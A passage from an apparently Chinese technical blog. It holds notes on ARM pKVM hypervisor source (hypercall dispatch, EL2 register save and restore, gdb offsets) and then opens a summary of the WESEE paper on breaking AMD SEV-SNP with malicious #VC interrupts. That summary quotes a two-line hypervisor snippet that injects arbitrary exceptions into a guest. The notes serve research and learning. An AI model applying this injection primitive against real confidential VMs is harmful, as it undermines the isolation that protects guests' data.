ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID          \</span><br><span class="line">    ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,             \</span><br><span class="line">               ARM_SMCCC_SMC_64,                \</span><br><span class="line">               ARM_SMCCC_OWNER_VENDOR_HYP,          \</span><br><span class="line">               ARM_SMCCC_KVM_FUNC_MEM_SHARE)</span><br><span class="line"></span><br><span class="line">#define ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID            \</span><br><span class="line">    ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,             \</span><br><span class="line">               ARM_SMCCC_SMC_64,                \</span><br><span class="line">               ARM_SMCCC_OWNER_VENDOR_HYP,          \</span><br><span class="line">               ARM_SMCCC_KVM_FUNC_MEM_UNSHARE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static inline u32 smccc_get_function(struct kvm_vcpu *vcpu)</span><br><span class="line">&#123;</span><br><span class="line">    return vcpu_get_reg(vcpu, 0);</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line"> * vcpu_get_reg and vcpu_set_reg should always be passed a register number</span><br><span class="line"> * coming from a read of ESR_EL2. Otherwise, it may give the wrong result on</span><br><span class="line"> * AArch32 with banked registers.</span><br><span class="line"> */</span><br><span class="line">static __always_inline unsigned long vcpu_get_reg(const struct kvm_vcpu *vcpu,</span><br><span class="line">                     u8 reg_num)</span><br><span class="line">&#123;</span><br><span class="line">    return (reg_num == 31) ? 0 : vcpu_gp_regs(vcpu)-&gt;regs[reg_num];</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line"> * Handler for protected VM HVC calls.</span><br><span class="line"> *</span><br><span class="line"> * Returns true if the hypervisor has handled the exit, and control should go</span><br><span class="line"> * back to the guest, or false if it hasn&#x27;t.</span><br><span class="line"> */</span><br><span class="line">bool kvm_handle_pvm_hvc64(struct kvm_vcpu *vcpu, u64 *exit_code)</span><br><span class="line">&#123;</span><br><span class="line">    u64 val[4] = &#123; SMCCC_RET_NOT_SUPPORTED &#125;;</span><br><span class="line">    u32 fn = smccc_get_function(vcpu);</span><br><span class="line">    struct pkvm_hyp_vcpu *hyp_vcpu;</span><br><span class="line"></span><br><span class="line">    hyp_vcpu = container_of(vcpu, struct pkvm_hyp_vcpu, vcpu);</span><br><span class="line"></span><br><span class="line">    switch (fn) &#123;</span><br><span class="line">    case ARM_SMCCC_VERSION_FUNC_ID:</span><br><span class="line">        /* Nothing to be handled by the host. Go back to the guest. */</span><br><span class="line">        val[0] = ARM_SMCCC_VERSION_1_1;</span><br><span class="line">        break;</span><br><span class="line">    case ARM_SMCCC_VENDOR_HYP_CALL_UID_FUNC_ID:</span><br><span class="line">        val[0] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_0;</span><br><span class="line">        val[1] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_1;</span><br><span class="line">        val[2] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_2;</span><br><span class="line">        val[3] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_3;</span><br><span class="line">        break;</span><br><span class="line">    case ARM_SMCCC_VENDOR_HYP_KVM_FEATURES_FUNC_ID:</span><br><span class="line">        val[0] = BIT(ARM_SMCCC_KVM_FUNC_FEATURES);</span><br><span class="line">        val[0] |= BIT(ARM_SMCCC_KVM_FUNC_HYP_MEMINFO);</span><br><span class="line">        val[0] |= BIT(ARM_SMCCC_KVM_FUNC_MEM_SHARE);</span><br><span class="line">        val[0] |= BIT(ARM_SMCCC_KVM_FUNC_MEM_UNSHARE);</span><br><span class="line">        break;</span><br><span class="line">    case ARM_SMCCC_VENDOR_HYP_KVM_HYP_MEMINFO_FUNC_ID:</span><br><span class="line">        if (smccc_get_arg1(vcpu) ||</span><br><span class="line">            smccc_get_arg2(vcpu) ||</span><br><span class="line">            smccc_get_arg3(vcpu)) &#123;</span><br><span class="line">            val[0] = SMCCC_RET_INVALID_PARAMETER;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            val[0] = PAGE_SIZE;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    case ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID:</span><br><span class="line">        return pkvm_memshare_call(hyp_vcpu, exit_code);</span><br><span class="line">    case ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID:</span><br><span class="line">        return pkvm_memunshare_call(hyp_vcpu);</span><br><span class="line">    default:</span><br><span class="line">        return pkvm_handle_psci(hyp_vcpu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    smccc_set_retval(vcpu, val[0], val[1], val[2], val[3]);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pgatble.pgd 是ttbr0_el2</p>
<p>host_mmu 是vttbr_el2 </p>
<p>如何配置host stage2？ fix_host_ownership与host pf</p>
<h3 id="kvm-call-hyp-nvhe"><a href="#kvm-call-hyp-nvhe" class="headerlink" title="kvm_call_hyp_nvhe"></a>kvm_call_hyp_nvhe</h3><p>vbar_el2的el1_sync可能为</p>
<ul>
<li>Host stage2 page fault：需要保存恢复通用寄存器</li>
<li>Host hypercall：需要x0作为返回值</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __create_hyp_private_mapping(<span class="type">phys_addr_t</span> phys_addr, <span class="type">size_t</span> size,</span><br><span class="line">                    <span class="type">unsigned</span> <span class="type">long</span> *haddr,</span><br><span class="line">                    <span class="keyword">enum</span> kvm_pgtable_prot prot)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">kvm_host_owns_hyp_mappings</span>()) &#123;</span><br><span class="line">        addr = <span class="built_in">kvm_call_hyp_nvhe</span>(__pkvm_create_private_mapping,</span><br><span class="line">                     phys_addr, size, prot);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IS_ERR_VALUE</span>(addr))</span><br><span class="line">            <span class="keyword">return</span> addr;</span><br><span class="line">        *haddr = addr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size = <span class="built_in">PAGE_ALIGN</span>(size + <span class="built_in">offset_in_page</span>(phys_addr));</span><br><span class="line">    ret = <span class="built_in">hyp_alloc_private_va_range</span>(size, &amp;addr);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = __create_hyp_mappings(addr, size, phys_addr, prot);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    *haddr = addr + <span class="built_in">offset_in_page</span>(phys_addr);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">kvm_cpu_context</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">user_pt_regs</span> regs;   <span class="comment">/* sp = sp_el0 */</span></span><br><span class="line"></span><br><span class="line">    u64 spsr_abt;</span><br><span class="line">    u64 spsr_und;</span><br><span class="line">    u64 spsr_irq;</span><br><span class="line">    u64 spsr_fiq;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">user_fpsimd_state</span> fp_regs;</span><br><span class="line"></span><br><span class="line">    u64 sys_regs[NR_SYS_REGS];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kvm_vcpu</span> *__hyp_running_vcpu;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This pointer has to be 4kB aligned. */</span></span><br><span class="line">    u64 *vncr_array;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">user_pt_regs</span> &#123;</span><br><span class="line">    __u64       regs[<span class="number">31</span>];</span><br><span class="line">    __u64       sp;</span><br><span class="line">    __u64       pc;</span><br><span class="line">    __u64       pstate;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> cpu_reg(ctxt, r)    (ctxt)-&gt;regs.regs[r]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_REG(type, name, ctxt, reg)  \</span></span><br><span class="line"><span class="meta">                type name = (type)cpu_reg(ctxt, (reg))</span></span><br><span class="line">                </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle_trap</span><span class="params">(<span class="keyword">struct</span> kvm_cpu_context *host_ctxt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u64 esr = <span class="built_in">read_sysreg_el2</span>(SYS_ESR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">ESR_ELx_EC</span>(esr)) &#123;</span><br><span class="line">    <span class="keyword">case</span> ESR_ELx_EC_HVC64:</span><br><span class="line">        <span class="built_in">handle_host_hcall</span>(host_ctxt);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle___pkvm_create_private_mapping</span><span class="params">(<span class="keyword">struct</span> kvm_cpu_context *host_ctxt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">DECLARE_REG</span>(<span class="type">phys_addr_t</span>, phys, host_ctxt, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">DECLARE_REG</span>(<span class="type">size_t</span>, size, host_ctxt, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">DECLARE_REG</span>(<span class="keyword">enum</span> kvm_pgtable_prot, prot, host_ctxt, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * __pkvm_create_private_mapping() populates a pointer with the</span></span><br><span class="line"><span class="comment">     * hypervisor start address of the allocation.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * However, handle___pkvm_create_private_mapping() hypercall crosses the</span></span><br><span class="line"><span class="comment">     * EL1/EL2 boundary so the pointer would not be valid in this context.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Instead pass the allocation address as the return value (or return</span></span><br><span class="line"><span class="comment">     * ERR_PTR() on failure).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> haddr;</span><br><span class="line">    <span class="type">int</span> err = __pkvm_create_private_mapping(phys, size, prot, &amp;haddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        haddr = (<span class="type">unsigned</span> <span class="type">long</span>)<span class="built_in">ERR_PTR</span>(err);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cpu_reg</span>(host_ctxt, <span class="number">1</span>) = haddr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">DEFINE</span>(CPU_USER_PT_REGS,  <span class="built_in">offsetof</span>(<span class="keyword">struct</span> kvm_cpu_context, regs));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CPU_XREG_OFFSET(x)  (CPU_USER_PT_REGS + 8*x)</span></span><br><span class="line"></span><br><span class="line">.macro save_callee_saved_regs ctxt</span><br><span class="line">    str x18,      [\ctxt, #<span class="built_in">CPU_XREG_OFFSET</span>(<span class="number">18</span>)]</span><br><span class="line">    stp x19, x20, [\ctxt, #<span class="built_in">CPU_XREG_OFFSET</span>(<span class="number">19</span>)]</span><br><span class="line">    stp x21, x22, [\ctxt, #<span class="built_in">CPU_XREG_OFFSET</span>(<span class="number">21</span>)]</span><br><span class="line">    stp x23, x24, [\ctxt, #<span class="built_in">CPU_XREG_OFFSET</span>(<span class="number">23</span>)]</span><br><span class="line">    stp x25, x26, [\ctxt, #<span class="built_in">CPU_XREG_OFFSET</span>(<span class="number">25</span>)]</span><br><span class="line">    stp x27, x28, [\ctxt, #<span class="built_in">CPU_XREG_OFFSET</span>(<span class="number">27</span>)]</span><br><span class="line">    stp x29, lr,  [\ctxt, #<span class="built_in">CPU_XREG_OFFSET</span>(<span class="number">29</span>)]</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line">.macro get_host_ctxt reg, tmp</span><br><span class="line">    adr_this_cpu \reg, kvm_host_data, \tmp</span><br><span class="line">    add \reg, \reg, #HOST_DATA_CONTEXT</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @dst: Result of per_cpu(sym, smp_processor_id()) (can be SP)</span></span><br><span class="line"><span class="comment"> * @sym: The name of the per-cpu variable</span></span><br><span class="line"><span class="comment"> * @tmp: scratch register</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">.macro adr_this_cpu, dst, sym, tmp</span><br><span class="line">    adrp    \tmp, \sym</span><br><span class="line">    add \dst, \tmp, #:lo12:\sym</span><br><span class="line">    get_this_cpu_offset \tmp</span><br><span class="line">    add \dst, \dst, \tmp</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line">.macro  get_this_cpu_offset, dst</span><br><span class="line">    mrs \dst, tpidr_el2</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line">展开后：</span><br><span class="line">adrp    x1, kvm_host_data</span><br><span class="line">add x0, x1, #:lo12:kvm_host_data</span><br><span class="line">mrs x1, tpidr_el2</span><br><span class="line">add x0, x0, x1</span><br><span class="line">add x0, x0, #HOST_DATA_CONTEXT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.macro host_el1_sync_vect</span><br><span class="line">        .align <span class="number">7</span></span><br><span class="line">.L__vect_start\@:</span><br><span class="line">        stp        x0, x1, [sp, #<span class="number">-16</span>]!</span><br><span class="line">        mrs        x0, esr_el2</span><br><span class="line">        ubfx        x0, x0, #ESR_ELx_EC_SHIFT, #ESR_ELx_EC_WIDTH</span><br><span class="line">        cmp        x0, #ESR_ELx_EC_HVC64</span><br><span class="line">        b.<span class="function">eq        __host_hvc</span></span><br><span class="line"><span class="function">        b        __host_exit</span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function"><span class="title">SYM_FUNC_START</span><span class="params">(__host_exit)</span></span></span><br><span class="line"><span class="function">        get_host_ctxt        x0, x1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="comment">/* Store the host regs x2 and x3 */</span></span></span><br><span class="line"><span class="function">        stp        x2, x3,   [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">2</span>)</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="comment">/* Retrieve the host regs x0-x1 from the stack */</span></span></span><br><span class="line"><span class="function">        ldp        x2, x3, [sp], #16        <span class="comment">// x0, x1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="comment">/* Store the host regs x0-x1 and x4-x17 */</span></span></span><br><span class="line"><span class="function">        stp        x2, x3,   [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">0</span>)</span>]</span></span><br><span class="line"><span class="function">        stp        x4, x5,   [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">4</span>)</span>]</span></span><br><span class="line"><span class="function">        stp        x6, x7,   [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">6</span>)</span>]</span></span><br><span class="line"><span class="function">        stp        x8, x9,   [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">8</span>)</span>]</span></span><br><span class="line"><span class="function">        stp        x10, x11, [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">10</span>)</span>]</span></span><br><span class="line"><span class="function">        stp        x12, x13, [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">12</span>)</span>]</span></span><br><span class="line"><span class="function">        stp        x14, x15, [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">14</span>)</span>]</span></span><br><span class="line"><span class="function">        stp        x16, x17, [x0, #<span class="title">CPU_XREG_OFFSET</span><span class="params">(<span class="number">16</span>)</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="comment">/* Store the host regs x18-x29, lr */</span></span></span><br><span class="line"><span class="function">        save_callee_saved_regs x0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="comment">/* Save the host context pointer in x29 across the function call */</span></span></span><br><span class="line"><span class="function">        mov        x29, x0</span></span><br><span class="line"><span class="function">        bl        handle_trap</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">__host_enter_restore_full:</span></span><br><span class="line"><span class="function">        /* Restore host regs x0-x17 */</span></span><br><span class="line"><span class="function">        ldp        x0, x1,   [x29, #CPU_XREG_OFFSET(<span class="number">0</span>)]</span></span><br><span class="line"><span class="function">        ldp        x2, x3,   [x29, #CPU_XREG_OFFSET(<span class="number">2</span>)]</span></span><br><span class="line"><span class="function">        ldp        x4, x5,   [x29, #CPU_XREG_OFFSET(<span class="number">4</span>)]</span></span><br><span class="line"><span class="function">        ldp        x6, x7,   [x29, #CPU_XREG_OFFSET(<span class="number">6</span>)]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        /* x0<span class="number">-7</span> are use for panic arguments */</span></span><br><span class="line"><span class="function">__host_enter_for_panic:</span></span><br><span class="line"><span class="function">        ldp        x8, x9,   [x29, #CPU_XREG_OFFSET(<span class="number">8</span>)]</span></span><br><span class="line"><span class="function">        ldp        x10, x11, [x29, #CPU_XREG_OFFSET(<span class="number">10</span>)]</span></span><br><span class="line"><span class="function">        ldp        x12, x13, [x29, #CPU_XREG_OFFSET(<span class="number">12</span>)]</span></span><br><span class="line"><span class="function">        ldp        x14, x15, [x29, #CPU_XREG_OFFSET(<span class="number">14</span>)]</span></span><br><span class="line"><span class="function">        ldp        x16, x17, [x29, #CPU_XREG_OFFSET(<span class="number">16</span>)]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        /* Restore host regs x18-x29, lr */</span></span><br><span class="line"><span class="function">        restore_callee_saved_regs x29</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        /* Do not touch any register after this! */</span></span><br><span class="line"><span class="function">__host_enter_without_restoring:</span></span><br><span class="line"><span class="function">        eret</span></span><br><span class="line"><span class="function">        sb</span></span><br><span class="line"><span class="function">SYM_FUNC_END(__host_exit)</span></span><br></pre></td></tr></table></figure>

<p>tpidr_el2硬件不会用 可以软件自己用 </p>
<p>把每个cpu一个的context存在这个寄存器中</p>
<p>handler想改寄存器 直接改内存 eret之前恢复寄存器</p>
<ul>
<li>没改 那就是最早的值 （mem abort）</li>
<li>改了 就把改完的内存值恢复到寄存器 （host hypercall）</li>
</ul>
<p>实际上可以直接在handler最后用write tpidr_el2来取代ret 不需要提供修改所有寄存器的接口</p>
<p>但是仍然需要保存恢复寄存器 只不过用的是栈</p>
<h3 id="Gdb"><a href="#Gdb" class="headerlink" title="Gdb"></a>Gdb</h3><p>b do_pkvm_init</p>
<p>hvc进入EL2 看b eq地址</p>
<p>aarch64-linux-gnu-objdump -d vmlinux &gt; arm.out</p>
<p>gdb中 0xb8dd0127f214 0xb8dd0127f000</p>
<p>vmlinux中ffff80008107f214 ffff80008107f000</p>
<p>offset 0xfffec7237fe00000 每次会变</p>
<p>ffff800081082710 &lt;__kvm_nvhe_fix_host_ownership_walker&gt;. -&gt;0xb8dd01282710</p>
<p>最后5个不变</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>kernel内存启动初始化早期拿出一块地址给EL2用 EL2有一套自己管理内存的方法库</li>
<li>一套精妙的EL2页表操作代码(kvm_pgtable_walk) 处理hyp stage1 host stage2 guest stage2</li>
<li>在valid和invalid pte上都加入bit表示owner host hyp guest</li>
<li>host stage2采用lazy mapping 发生page fault的时候到EL2补映射</li>
<li>用0表示owner是host，这样巧妙地不需要对host stage2进行自己的处理，只需要把属于hyp的设为1</li>
<li>在初始化完整后直接启用host stage2页表</li>
<li>guest的stage2 页表由kvm维护（与pkvm无关）</li>
<li>Guest的stage2页表操作从EL1提到EL2处理</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2025/02/04/papers/WESEE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/02/04/papers/WESEE/" class="post-title-link" itemprop="url">WESEE: Using Malicious #VC Interrupts to Break AMD SEV-SNP</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-02-04 20:48:29 / Modified: 20:53:17" itemprop="dateCreated datePublished" datetime="2025-02-04T20:48:29+08:00">2025-02-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>934</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>3 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="WESEE-Using-Malicious-VC-Interrupts-to-Break-AMD-SEV-SNP"><a href="#WESEE-Using-Malicious-VC-Interrupts-to-Break-AMD-SEV-SNP" class="headerlink" title="WESEE: Using Malicious #VC Interrupts to Break AMD SEV-SNP"></a>WESEE: Using Malicious #VC Interrupts to Break AMD SEV-SNP</h1><p>IEEE S&amp;P 2024</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjMyMzI3ZjhiYTRjYmU1M2U3MTM1MzIzNTBjZjgwNzdfRW5FMzNOSmlHUkRGQkdzSnpoVlVnSm9ZTG1ZRVBUUVNfVG9rZW46TDVKNmJtTHJIb25Wb1d4RkZXTGM0NXlmbmxmXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p>Linux kernel作为最广泛使用的支持CVM的guest OS，攻击面仍然很大，通过精心利用某些漏洞（如恶意中断）可以完成端到端的攻击（root shell）。</p>
<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25742">&gt; CVE-2024-25742</a></p>
<h2 id="Background：-VC-exception"><a href="#Background：-VC-exception" class="headerlink" title="Background：#VC exception"></a>Background：#VC exception</h2><h3 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h3><p>SEV-ES保护了寄存器，增加GHCB用于Guest-Host通信</p>
<p>当发生某些vmexit时，hypervisor需要当前guest的寄存器信息为guest提供服务</p>
<ul>
<li>cpuid</li>
<li>rdtsc</li>
<li>MMIO</li>
</ul>
<p>引入#VC exception（中断号29） 便于拷贝相应的寄存器信息</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MDBiMjgyYzM4NWEyNDYzM2Q5YjNkN2MzY2ZjNWJiNmNfRXlZUXc3Vmo4cmlaYnBUZ3h2S0paYXJkemNyQUVUcHBfVG9rZW46TzlLdmJWczNmb013NE14ZGRqcWNNamZLbktjXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p>exception_number和exit_reason可以由软件配置！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svm-&gt;vmcb-&gt;control.event_inj = user_data_npf_ex.exception_number | SVM_EVTINJ_VALID | SVM_EVTINJ_VALID_ERR | SVM_EVTINJ_TYPE_INTR;</span><br><span class="line">svm-&gt;vmcb-&gt;control.event_inj_err = user_data_npf_ex.exception_error_code;</span><br></pre></td></tr></table></figure>

